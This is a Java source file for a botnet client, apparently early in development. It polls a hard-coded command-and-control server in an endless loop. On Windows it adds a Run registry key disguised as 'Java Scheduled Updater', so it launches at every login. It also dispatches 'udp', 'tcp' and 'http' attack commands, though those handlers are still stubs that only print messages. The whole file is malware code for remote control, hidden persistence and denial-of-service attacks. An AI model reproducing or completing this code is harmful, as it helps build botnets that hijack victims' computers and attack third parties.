package com.am77;


import com.am77.extern.HttpRequest;
import com.am77.extern.RegistryUtils;

import java.net.ConnectException;

/**
 * Created by Carter on 5/2/17.
 */
public class Tests {

    public static String filename = "jupdate.jar";
    public static boolean debug = true;

    public static void main(String[] args) throws InterruptedException{

        String os = System.getProperty("os.name");

        while (true) {

            try {
                HttpRequest request = HttpRequest.get("http://192.168.153.34:8080");
                String body = request.body();
                System.out.println(body);

                if (os.startsWith("Windows")) {
                    addToStartup();
                }
                body = body.replace("\n", "");

            /*
            Parse the response here
             */

                if (body.equals("NONE")) {
                    debug("Got a none");
                    Thread.sleep(3000);
                } else if (body.startsWith("udp")) {
                    debug("UDP ATTACK");
                } else if (body.startsWith("tcp")) {
                    debug("TCP ATTACK");
                } else if (body.startsWith("http")) {
                    debug("HTTP ATTACK");
                } else {
                    debug("Got an unknown command: " + body);
                }

            } catch (HttpRequest.HttpRequestException hre){
                debug("Server not responding, waiting 10");
                Thread.sleep(10000);
            }
        }
    }

    private static void addToStartup(){
        try {
            RegistryUtils.writeStringValue(RegistryUtils.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Scheduled Updater", "\"" + System.getProperty("user.home") + "\\"  + filename + "\"");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void debug(String msg){
        if (debug){
            System.out.println(msg);
        }
    }
}
